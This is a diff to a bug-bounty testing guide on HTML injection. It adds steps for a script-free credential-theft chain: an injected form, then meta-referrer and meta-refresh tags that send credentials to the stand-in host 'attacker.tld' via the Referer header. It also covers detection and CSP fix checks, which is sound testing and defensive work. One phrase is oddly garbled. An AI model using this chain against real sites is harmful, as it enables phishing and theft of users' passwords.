@@ -2,7 +2,7 @@
 name: hunt-html-injection
 description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to hunt-xss."
 sources: hackerone_public, public_research
-report_count: 6
+report_count: 7
 ---
 
 ## What is HTML Injection
@@ -60,3 +60,16 @@ Confirmed when your injected tag appears in the response body with literal `<` a
 - XSS: `<script>alert(1)</script>` executes JavaScript.
 
 Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.
+
+## CSP-proof credential theft via injected form + meta-refresh (no JavaScript)
+
+A strict CSP that blocks all scripts (`default-src 'none'` / `script-src 'none'`) does **not** stop this chain, because none of its steps are script execution. Check the policy's `form-action` directive specifically: `form-action` does **not** fall back to `default-src` — if it's absent, forms can `POST`/`GET` to any origin even under an otherwise airtight policy, and even `form-action 'self'` still permits a same-origin form, which is all this needs.
+
+1. Inject an HTML `<form>` with no `action` attribute at the HTML-injection point — it submits back to the same vulnerable page/parameter.
+2. Give it a username field, a password field, and a hidden/textarea field (named after the same vulnerable parameter) holding a **second-stage payload**.
+3. When the victim submits, the credentials and the second-stage payload travel in the URL (GET) or body (POST). The page reflects the parameter again — this time rendering the second-stage payload as live HTML.
+4. The second-stage payload is a `<meta name="referrer" content="unsafe-url">` tag followed by `<meta http-equiv="refresh" content="0;url=https://attacker.tld">`. `unsafe-url` forces the browser to send the *full* referring URL — including the credentials that were just in the query string — in the `Referer` header of the forced navigation.
+
+Net effect: the attacker's server receives the victim's username/password in an incoming request's `Referer` header, with no JS ever executing. CSP, XSS filters, and script-sandboxing are irrelevant to every step. Detection signal: unescaped reflection of an injectable parameter **combined with** a response CSP that lacks `form-action` or sets it to `'self'` only — that combination is "VIABLE," not mitigated. Full write-up (CSP bypass research, no target-specific payload copied here): <https://portswigger.net/research/blind-trust-stealing-credentials-through-csp>.
+
+Fix verification: confirm the deployed policy sets `form-action 'none'` (or an explicit allow-list that excludes attacker-controlled pretty much everything) in the *enforcing* `Content-Security-Policy` header, not only `Content-Security-Policy-Report-Only` — report-only blocks nothing. Chains to `hunt-ato` (credential capture) and `hunt-cors`/`hunt-open-redirect` (the final forced navigation).
